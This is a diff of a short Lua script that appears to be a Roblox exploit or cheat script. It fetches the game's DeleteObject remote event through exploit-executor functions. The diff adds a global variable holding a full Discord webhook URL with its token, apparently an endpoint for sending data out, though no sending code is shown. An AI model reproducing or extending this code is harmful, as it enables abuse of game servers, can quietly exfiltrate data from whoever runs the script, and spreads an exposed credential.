@@ -1,7 +1,7 @@
 local  lp = game.Players.LocalPlayer
 del=game:GetService("ReplicatedStorage").Events.DeleteObject
 
-
+getgenv().web = "https://discord.com/api/webhooks/1547329972497289316/" .. "mkwxTP1tJE0MpCIP3jQP0pB8ZVe06u8Gix_nTcE3euJ91CbhW3b-r2qUxHBfVDEn_1pH"
 local obby = 4
 local set = 80
 local headSize = vector.create(math.random(70,130),0.5,math.random(70,130))
